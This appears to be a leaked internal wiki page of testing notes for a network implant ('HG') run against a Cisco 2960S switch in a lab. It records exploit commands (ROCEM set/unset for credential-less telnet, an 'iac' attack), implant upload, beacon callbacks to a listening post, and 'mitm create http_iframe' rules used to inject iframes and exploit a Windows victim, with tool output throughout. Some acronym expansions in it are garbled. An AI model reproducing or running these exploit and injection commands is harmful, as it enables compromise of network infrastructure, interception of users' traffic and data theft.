@@ -1,0 +1,413 @@
+
+                        Owner: User #71467
+JQJHAIRPIECE - HG Testing
+HG was delivered for JQJHAIRPIECE on 8/21/2015 for the Cisco 2960S.  CONOP will be to FLXFluxwire to 192.168.3.40 and then .  Testing will be limited to performance testing and SMITE in order to provide a quick turn around for Operator. Also need to test SMITE rules that exclude an internal web server (Xetron can help GIPPLE craft these rules).
+Testing summary
+
+ROC-12 - EAREnterprise Archive 5471 - ROCEM set/unset does not work with flux.  This issue was fixed by Xetron in ROCEM v1.2, delivered to TR on 08/27/15
+ROCEM regression testing included - test of set/unset feature fixed, test of complete CONOPConcealed Operation for use with HG, test ROCEM interactive session, and ad-hoc tests
+Received exact model 2960S 8/31 and installed
+Performance testing shows HG has little to no impact at traffic levels tested:
+
+ 
+
+
+ 
+50M no HG
+50M w HG
+500M no HG
+500M w HG
+
+
+CPU Utilization
+8%
+9%
+8%
+9%
+
+
+Mem Utilization
+44%
+47%
+44%
+47%
+
+
+Latency (ms)
+4
+4
+4
+3
+
+
+Show tech analysis - fixed output in show stacks command after hg uninstall, fixed init process while HG running, don't see ipv4 security aces increase
+ 
+ 
+ 
+Testing Notes
+Information about target:
+
+WS-C2960S-24PD-L (testing used WS-C2960S-24PS-L)
+Boot loader version 12.2(55r)SE (testing used 12.2(55r)SE1)
+IOS c2960s-universalk9-mz.122-55.SE8.bin
+Local authentication
+7 interfaces up - 1,5,6,9,10,20,24
+ports 1,5,6,10 are in VLANVirtual Local Area Network 3
+port 20 is in VLANVirtual Local Area Network 8
+port 24 is uplink trunk
+
+
+MGMT IP - int vlan 10 - 192.168.10.136
+Client mode for VTPVLAN Trunk Protocol domain cisco
+VLANS configured - 1 - 12
+Upstream  router - WS-3560G-24-TS running IOSApple operating system for small devices C3560-IPSERVICESK9-M, version 12.2(55)SE9.  (testing used WS-C3560G-24PS running IOS C3560-IPSERVICESK9-M, version 12.2(55)SE8)
+Downstream switch - 2960
+
+VMS used
+
+Hairpiece-ICON-172.20.12.30
+Hairpiece-Seeds-Fedora10 192.168.3.10
+Hairpiece-Flux-192.168.3.40
+Hairpiece-Victim - 192.168.10.11
+
+
+Smoke Test - Use ROCEM to throw HG via FLUX
+Configured Seeds traffic on Seeds VMVirtual Machine for Hairpiece network and started ARP, DNSDomain Name System and HTTPSHypertext Transfer Protocol Secure seeds traffic
+Successfully established FLUX connection from Hairpiece-Icon to hairpiece-Flux at 192.168.3.40.
+Sucessfully established rocem interactive mode via flux
+Set rocem
+Could not set/unset rocem through flux, but tried outside of flux and it works fine. For purposes of smoke testing, continuing without flux.
+Set rocem outside of flux
+Attacked with iacroot@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1h/attack/linux# ./iac --ip 192.168.10.136 --l cisco:test testLGEC -125DHEC -159Mroot@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1h/attack/linux#
+
+
+Installed HG with remote:
+GOOD - status OK.OP: RUNCODE using Per Second Code address: 0x044efd34 No data Result: 0x00000001
+
+Established CTCounter Terrorism session on port 444 since flux was using port 443.  Used Seeds host as IP to trigger.> ilm listen hairpiece-1h.txt
+Listening for clients on port 444...Accepted connection from 192.168.3.10:15890Attempting SSLSecure Socket Layer Handshake...SSL Handshake Successful![Success] New Key: lMzoTDqJUimWHf*yOQXqdzvFrk*LgsOzKIqu8blZt98=************ Success ************[ilm listen hairpiece-1h.txt]
+[192.168.3.10]>
+
+Created mitm rule:[192.168.3.10]> mitm create http_iframe 192.168.10.11 255.255.255.0 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk[Pending] Job: 136300776************ Pending ************[mitm create http_iframe 192.168.10.11 255.255.255.0 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ -en -bc -bk]
+[192.168.3.10]> [Success]
+
+Web browsed from Victim and received iframe:<body><iframe src="http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" 
+Uninstalled HG:[192.168.3.10]> device uninstall_hg -f
+Warning!!! This command will remove all capabilities. If installed, EVExecution Vector capabilities will be wiped, but MAY LEAVE BEHIND ARTIFACTS Memory permissions will not be reset. See Operational Use Notes for more information. This connection will be terminated as a result of this command.
+Do you wish to continue? Enter yes or no: yes
+[Success] ************ Success ************[device uninstall_hg -f]
+[192.168.3.10]> [Remote Failure] ************ Remote Failure ************Connection to device lost!!
+
+
+
+Characterization of ROCEM issues with Flux - ROC-12
+Collected wiresharks of failed set attempts and successful interactive attempts from flux, icon, and rocem log files and sent all to Xetron.
+Tried using -c flag to change chunk size in ROCEM and tried every size in increments of 50 between 100 and 1500 - ROCEM still would not set through flux.
+Tried building a flux node with mtu set to 1500 - no luck, ROCEM would not work.
+Tried using a different flux node, from CMNCaiman (Codename)? testing, at 172.20.19.11 to attempt to flux from outside the network - no difference, rocem would not set.
+
+
+IXIA performance test - Baseline - no HG
+Reloaded DUTDevice Under Test to start with a clean configuration
+Set up IXIA test to run on clean device using Hairpiece NN and the following test parameters:
+50M of constant traffic
+50 internal hosts
+50 upstream hosts
+4 hour test kicked off at 11:40
+
+
+Test complete, saved solarwinds grapsh of CPU, MEM and latency.  No alarming spikes, switch was not stressed with this amount of traffic.
+Saved test report to share as well.
+
+
+IXIA performance test - Repeat test 3 but with HG installed
+Reload DUTDevice Under Test to start with a clean device
+Set ROCEM without using flux
+Attacked with IACInternational Access Code and uploaded HG
+Established CTCounter Terrorism session
+Kicked off IXIA test at 4:30 PM
+Collected output including report and solarwinds and saved to share.  Basically no impact when HG added at 50M of traffic.
+
+
+IXIA performance test - Higher stress - 500M test - no HG
+Reload DUTDevice Under Test to start with a clean device
+Setup IXIA to run with same parameters as Test 3, except 500M of traffic - Kicked off at 4:20
+Collected Report and solarwinds graphs
+
+
+IXIA performance test - Repeat test 5 but with HG installed
+Reload DUTDevice Under Test to start with a clean device
+Set ROCEM without using flux
+Attack with IACInternational Access Code and upload HG
+Establish CTCounter Terrorism session
+Kick off IXIA test at 500M at 9:20 AM
+
+
+Received ROCEM on 8/27/15 and began tests for fix to flux
+Loaded new ROCEM v1.2 delivery to ICON workstation
+Established flux connection from ICON to 192.168.3.40
+Used ROCEM set command - successful:root@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1r/rocem# ./rocem_c2960s-universalk9-mz.122-55.SE8.py -s -f fill.bin 192.168.10.136[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c2960s-universalk9-mz.122-55.SE8Host: 192.168.10.136Action: Set****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.10.136:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Done
+
+Telnetted to cisco and was not prompted for creds
+Unset ROCEM successfully:root@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1r/rocem# ./rocem_c2960s-universalk9-mz.122-55.SE8.py -u -f fill.bin 192.168.10.136[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c2960s-universalk9-mz.122-55.SE8Host: 192.168.10.136Action: Unset****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.10.136:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Done
+
+Telnetted to device and was now prompted for creds again, indicating successful unset.
+
+
+Smoke test of complete CONOPConcealed Operation through flux
+Reloaded DUTDevice Under Test to start with a clean device\
+Establish Flux tunne
+Set ROCEM, IACInternational Access Code attack and upload HG
+Unset ROCEM
+Establish HG Comms on port 444
+Rebuilt Flux to use 8443 on ICON box so that HG can call back to 443.
+Established CTCounter Terrorism session with HG
+Created SMITE rule:mitm create http_iframe 192.168.10.0 255.255.255.0 0 0 0.0.0.0 0.0.0.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk
+
+
+Successfully exploited Windex victim with iframe, to both coverweb and google:
+INFO: CMD >> cat secrets.txt====== C:\Documents and Settings\Loki Lab\Desktop\secrets.txtINFO: ====== C:\Documents and Settings\Loki Lab\Desktop\secrets.txtThis is where we keep the double top secret info.INFO: This is where we keep the double top secret info.ST2 sess[ 486] >
+
+
+
+Test SMITE rule counter
+[192.168.3.10]> mitm create http_iframe 192.168.10.0 255.255.255.0 0 0 0.0.0.0 0.0.0.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -ac 5 -sm 10 -en -bc -bk
+Created rule above to test for setting max sessions affected per host to 5 and overall max sessions to 10
+Browsed from Windex victim 5x and rx iframe 5x successfully.
+Confirmed that after the 5th iframe, further web browsing sessions from the windex victim were not injected.  Sessions remaining listed as 5.
+Attempted to browse from Seeds host to confirm no iframe injected for hosts on vlan 3 - did not receive iframe
+Browsed from Windex victim 2 and did rx iframe 5 more times, after fifth time, HG reported no sessions remaining and I received no further iframes.
+Deleted mitm rule
+Did not record any CPU spikes during mitm rules firing
+
+
+Test FilterBroker module stop, start
+Turned on 50M of IXIA traffic, enterprise profile
+Confirmed FilterBroker module running with module show:FilterBroker       22               Yes  Running  0x47d5c54   default:FilterBroker.mod
+stopped module
+
+[192.168.3.10]> module stop FilterBroker[Success] ************ Success ************[module stop FilterBroker]
+[192.168.3.10]>
+
+FilterBroker       22               Yes  Stopped  0x47d5c54   default:FilterBroker.mod  
+Started filterbroker[192.168.3.10]> module start FilterBroker.mod[Success] ************ Success ************[module start FilterBroker.mod]
+[192.168.3.10]>
+
+Did an ilm refresh, then module show:FilterBroker       22               Yes  Running  0x4393d44   default:FilterBroker.mod
+Created a new mitm rule - rule successfully created with ID 5
+Deleted rule 5
+
+
+Test uninstall of HG
+IXIA traffic running
+uninstalled HG with device uninstall_hg -f[192.168.3.10]> device uninstall_hg -f
+Warning!!! This command will remove all capabilities. If installed, EVExecution Vector capabilities will be wiped, but MAY LEAVE BEHIND ARTIFACTS Memory permissions will not be reset. See Operational Use Notes for more information. This connection will be terminated as a result of this command.
+Do you wish to continue? Enter yes or no: yes
+[Success] ************ Success ************[device uninstall_hg -f]
+[192.168.3.10]> [Remote Failure] ************ Remote Failure ************Connection to device lost!!>
+
+
+No log messages recevied on console
+
+
+Test ROCEM v1.2 set and unset - ./rocem_c2960s-universalk9-mz.122-55.SE8.py -s -f fill.bin 192.168.10.136
+With IXIA traffic running, testing multiple ROCEM set/unsets via flux
+Completed 10 rounds of ROCEM set/unset and between each command verified expected behavior on login to switch
+Tried setting ROCEM 5 times in a row - no issues, ROCEM output looks the same each time, no log messages to DUTDevice Under Test console or CPU spikes
+Tried unsetting ROCEM 5 times in a row - no issues, ROCEM output looks the same each time, no log messages to DUTDevice Under Test console or CPU spikes
+
+
+Test ROCEM interactive session
+Establish IXIA traffic - 50M
+Verified Flux still active
+Telnet to device to ensure I am challenged for creds - login and rx expected priv level
+Establish ROCEM interactive session:root@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1r/rocem# ./rocem_c2960s-universalk9-mz.122-55.SE8.py -i 192.168.10.136
+Execute device survey commands - show run, show arp, show users (shows telnet session from flux ip with no user as expected), show ip int br, show log, show vlan, show version
+Established a non-ROCEM telnet session while ROCEM interactive session active - was challenged for creds and rx expected priv level.  
+Exited ROCEM interactive session:SW-06# exitConnection closed by foreign host.[+] Unsetting[*] Attempting connection to host 192.168.10.136:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Doneroot@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1r/rocem#
+
+Telneted back into switch with non-ROCEM user and rx expected challenge for creds and priv level.
+no syslogs generated during this session
+commands run during ROCEM session are not in show history (show history all is not available on this device)
+no spikes in CPU observed during ROCEM interactive session
+
+
+Ad hoc - Test ROCEM when non-ROCEM user at Username prompt (with 50M IXIA traffic)
+Established a telnet session to device and left it at the Username: prompt
+Estalished ROCEM interactive session from ICON
+Went back to telnet session and logged in - rx expected priv level
+Exited ROCEM interactive session
+Exited telnet session
+Established a telnet session to device and left it at the Username: prompt
+Set ROCEM from ICON
+Went back to telnet sesion and logged in - rx expected priv level
+Unset ROCEM from ICON
+Exited the telnet session
+Re-telneted to device and rx expected priv level
+No CPU spikes or log messages observed during this test
+
+
+Ad-hoc - Test ROCEM when non-ROCEM user at Password: prompt (with IXIA 50M traffic)
+Established a telnet session to device and entered username but left it at the Password: prompt
+Established ROCEM interactive session from ICON
+Went back to telnet session and logged in - rx expected priv level
+Exited telnet session
+Exited ROCEM interactive session
+Established a telnet session to device and entered username but left it at the Password: prompt
+Set ROCEM
+Went back to telnet session and logged in - rx expected priv level and password challenge
+Established a new telnet session in another window to device and as expected got credless priv 15
+exited new telnet session
+Exited telnet session
+Unset ROCEM
+No messages logged or syslogs generated
+
+
+Ad-hoc - Test ROCEM configuration changes (with IXIA traffic)
+Establish ROCEM interactive session 
+Change interface description
+Exit interactive ROCEM session
+Interface changes were logged, no user reported:*Mar  3 17:56:03.580: %SYS-5-CONFIG_I: Configured from console by vty0 (192.168.3.40)
+
+
+Test CONOPConcealed Operation again after set/usets, with IXIA traffic
+IXIA traffic running, flx tunnel up
+Set ROCEM 
+
+root@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1r/rocem# ./rocem_c2960s-universalk9-mz.122-55.SE8.py -s 192.168.10.136[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c2960s-universalk9-mz.122-55.SE8Host: 192.168.10.136
+Proceed? (y/n)y  [*] Attempting connection to host 192.168.10.136:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Done
+Action: Set****************************************
+
+IAC attack - observed usual high 30s % CPU spike during attack - root@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1h/attack/linux# ./iac --ip 192.168.10.136 --l cisco:test testLGEC -125DHEC -159M
+
+Unset ROCEMroot@hairpiece-icon:/home/user1/rocem/ops/hairpiece/hairpiece-1r/rocem# ./rocem_c2960s-universalk9-mz.122-55.SE8.py -u 192.168.10.136[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c2960s-universalk9-mz.122-55.SE8Host: 192.168.10.136Action: Unset****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.10.136:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Done
+
+Used remote to upload HG - no noticeable increase in CPU during HG upload
+Established CTCounter Terrorism session with HG -hairpiece.txt had inter set to fw0, added a bridge in flux for port 443, added a route in flux for 192.168.3.10 (IP HG will impersonate)[192.168.3.10]> beacon call_base_back https 192.168.3.40 443[Success] Trigger Sequence Number sent: 20************ Success ************[beacon call_base_back https 192.168.3.40 443]
+ 
+> ilm listen hairpiece-1h.txt
+Listening for clients on port 443...Accepted connection from 192.168.3.10:12021Attempting SSLSecure Socket Layer Handshake...SSL Handshake Successful![Success] New Key: lKrKpz01fbjBOvwswVnnQubw5ybZU74EjnnylEH0A*s=************ Success ************[ilm listen hairpiece-1h.txt]
+
+Created SMITE rule[192.168.3.10]> mitm create http_iframe 192.168.10.0 255.255.255.0 0 0 0.0.0.0 0.0.0.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -ac 5 -sm 10 -en -bc -bk[Pending] Job: 136300856************ Pending ************[mitm create http_iframe 192.168.10.0 255.255.255.0 0 0 0.0.0.0 0.0.0.0 80 80 http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ -ac 5 -sm 10 -en -bc -bk]
+
+Successfully windexed victim
+Deleted rule
+Uninstalled HG with device uninstall
+No log messages observed on DUT, no cpu spikes.
+
+
+On-device opsec test 
+reload DUTDevice Under Test to start with clean device
+collect show tech from switch and collect config in RANCID
+with ixia traffic, flux in place, set rocem, iac attack, unset rocem, uploaded hg, establish ct session.
+collect show tech
+uninstall hg
+collect show tech
+
+
+Replaced 2960-S with identical match to target - WS-C2960S-24PD-L.  Bootldr now also an exact match.
+Repeat ROCEM set/unset and interactive session smoke test on exact platform
+Verify IXIA traffic and flux up
+Successfully used ROCEM interactive session 10 times in a row
+Successfully set/unset ROCEM 10 times in a row, verifying between each that proper creds were required
+No logs or CPU spikes observed
+
+
+Complete run through of CONOPConcealed Operation on new switch
+IXIA traffic and Flux running
+Set ROCEM, IACInternational Access Code attack, Unset ROCEM
+Upload HG with remote
+Establish CTCounter Terrorism session
+Execute SMITE against victim - create rule, disable rule, delete rule
+Uninstall HG
+
+
+Test ROCEM without Flux
+Without flux, set ROCEM successfully
+Unset ROCEM and verified that creds are required
+Establish ROCEM interactive session
+Exit and verify that creds required
+
+
+Ad-hoc SMITE tests on new switch platform
+Verify flux and ixia traffic
+Reload DUTDevice Under Test to start with clean device
+Set ROCEM, IACInternational Access Code attack, unset ROCEM
+Use remote to upload hg
+Establish CTCounter Terrorism session: beacon call_base_back https 192.168.3.40 443
+
+mitm create http_iframe 192.168.10.0 255.255.255.0 0 0 0.0.0.0 0.0.0.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -ac 5 -en -bc -bk
+Used this rule to limit SMITE to affect any single host just 5 times.
+Successfully executed SMITE and Windexed host - 5 times
+Attempted a 6th iframe on the same host and it was not injected
+Successfully used SMITE on Victim 2.
+Reloaded FilterBroker module - module stopped and started successfully, mitm show now reports no rules
+Readded mitm rule and was able to successfully Iframe both windows victims once again
+Attempted to disable rule and i got an error, the rule still has an active session and command will run once it's closed
+Attempted to delete rule and got the same error.  checked and one session still listed as active.  After a minute, i tried to view the rule again with mitm rule show 2, and it was no longer present
+mitm show lists no rules present
+
+
+Ad hoc - Test smite rules with same traffic matching rule but different iframe string to inject
+Created two identical rules, rule 3 with usual iframe and rule 4 with new iframe[192.168.3.10]> mitm show[Success] Actions Available:  Action: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Version: 3  Number of Rules: 2  Rules:  ID: 3 4  Type: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Enabled: Yes Yes  Persistent: No No Persistent State: -- --  Source IP: 192.168.10.0/24 192.168.10.0/24  Dest IP: 0.0.0.0/0 0.0.0.0/0  Action Data: http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJhttp://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=higher************ Success ************[mitm show]
+
+Attempted to SMITE both Victims and both times each rx the iframe from rule 3, the lower numbered rule.  This is consistent with Aquaman 5 testing.
+
+
+ACE and Survey, Snooped host lists Smoke testing
+Performed a quick smoke test of ace module by running show commands through cmd exec "show ver" syntax
+Performed a quick smoke test of arp survey:[192.168.3.10]> socket get_arp_survey_data [Success]  Vlan: 3 Sender Protocol Address Sender Hardware Address Target Protocol Address Time Last Updated  192.168.3.10 00:50:56:88:25:6d 192.168.3.254 2015-09-01T14:57:49Z   Vlan: 10 Sender Protocol Address Sender Hardware Address Target Protocol Address Time Last Updated  192.168.10.11 00:50:56:88:40:eb 192.168.10.254 2015-09-01T14:56:53Z  192.168.10.12 00:50:56:88:c8:33 192.168.10.254 2015-09-01T14:49:13Z  192.168.10.11 00:50:56:88:40:eb 192.168.10.11 2015-09-01T14:25:00Z  192.168.10.11 00:50:56:88:40:eb 192.168.10.12 2015-09-01T14:21:36Z  192.168.10.12 00:50:56:88:c8:33 192.168.10.12 2015-09-01T14:21:35Z  ************ Success ************[socket get_arp_survey_data]
+
+Verified snooped host lists:
+
+[192.168.3.10]> dns get_snooped_host_list_client 0 0[Pending] Job: 137073152************ Pending ************[dns get_snooped_host_list_client 0 0]
+[192.168.3.10]> [Success]
+IP Address MACApple Operating System Addr VLANVirtual Local Area Network TTLTime To Live Count Resolver IP Status
+192.168.3.10 00:50:56:88:25:6D 3 128 10 4.4.4.4 GOODReceived 1 entries.
+Job: 137073152************ Success ************
+[192.168.3.10]> web get_snooped_host_list_client 0 0[Success] There were no snooped entries************ Success ************[web get_snooped_host_list_client 0 0]
+[192.168.3.10]> https get_snooped_host_list_client 0 0[Success]
+ NonProxy Proxy Last Used IP Addr MACApple Operating System Addr VLANVirtual Local Area Network TTLTime To Live Count Count Proxy IP
+0. 192.168.3.10 00:50:56:88:25:6D 3 64 19 0 0.0.0.0Received 1 entries.
+************ Success ************[https get_snooped_host_list_client 0 0]
+[192.168.3.10]>
+
+
+
+
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 [Xetron]
+| 7 [Xetron]
+| 8 [Xetron]
+| 9 [Xetron]
+| 10 [Xetron]
+| 11 [Xetron]
+| 12 [Xetron]
+| 13 [Xetron]
+| 14 [Xetron]
+| 15 [Xetron]
+| 16 [Xetron]
+| 17 [Xetron]
+| 18 [Xetron]
+| 19 [Xetron]
+| 20 [Xetron]
+| 21 [Xetron]
+| 22 [Xetron]
+| 23 [Xetron]
+| 24 [Xetron]
+| 25 [Xetron]
+|
+                    
